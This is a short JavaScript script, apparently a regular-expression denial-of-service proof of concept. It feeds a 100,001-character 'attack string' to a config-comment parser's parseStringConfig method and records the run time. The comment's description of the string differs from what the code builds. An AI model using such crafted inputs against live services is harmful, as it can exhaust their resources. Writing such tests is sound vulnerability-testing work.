const ConfigCommentParser = require("./config-comment-parser.js");

//Attack String :""+" "*100000+"A"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "A";

var parser = new ConfigCommentParser();
console.log(parser.parseStringConfig(str, ""));

// real    0m0.308s
// user    0m0.138s
// sys     0m0.035s
